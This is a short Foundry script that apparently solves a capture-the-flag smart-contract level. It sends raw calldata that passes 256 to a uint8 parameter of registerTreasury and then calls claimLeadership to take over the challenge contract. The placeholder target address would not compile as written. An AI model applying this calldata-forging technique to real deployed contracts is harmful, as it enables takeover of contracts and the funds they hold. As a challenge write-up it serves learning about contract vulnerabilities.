// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

contract HigherOrderSolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // function selector
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));

        // pass 256 (0x100) instead of uint8
        bytes memory data = abi.encodePacked(selector, uint256(256));

        (bool success,) = target.call(data);
        require(success, "call failed");

        // now claim leadership
        (success,) = target.call(abi.encodeWithSignature("claimLeadership()"));
        require(success, "claim failed");

        vm.stopBroadcast();
    }
}